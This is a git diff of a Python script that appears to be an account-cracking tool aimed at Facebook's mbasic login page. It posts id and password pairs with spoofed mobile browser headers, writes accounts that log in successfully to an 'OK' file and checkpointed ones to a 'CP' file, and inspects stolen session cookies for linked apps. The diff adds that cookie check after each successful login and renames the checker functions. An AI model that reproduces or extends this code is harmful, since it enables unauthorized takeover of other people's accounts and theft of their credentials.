@@ -1508,6 +1508,7 @@ def reguler(idf,pwv,awal):
 				prints(tree)
 				os.popen('play-audio o.mp3')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
+				cek_apk(kuki)
 				break
 			else:continue
 		except requests.exceptions.ConnectionError:time.sleep(31)
@@ -1695,7 +1696,7 @@ def cek_apk(kuki):
 		print ("\r    %s \033[0mcookie invalid"%(M))
 
 
-def ceker(idf,pw):
+def ceker1(idf,pw):
 	global cp
 	ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
 	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
@@ -1710,7 +1711,6 @@ def ceker(idf,pw):
 			if anj.get('name') in lion:
 				data.update({anj.get('name'):anj.get('value')})
 		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
-		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
 		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 		cp+=1
 		opsi = kent.find_all('option')
@@ -1720,7 +1720,6 @@ def ceker(idf,pw):
 			for opsii in opsi:
 				print('\r%s---> %s%s'%(kk,opsii.text,x))
 	except Exception as c:
-		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
 		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
 		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 		cp+=1
@@ -1784,7 +1783,7 @@ def cek_opsi():
 	exit()
 
 
-def ceker1(idf,pw):
+def ceker(idf,pw):
 	sess=requests.Session()
 	data={}
 	uua="Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
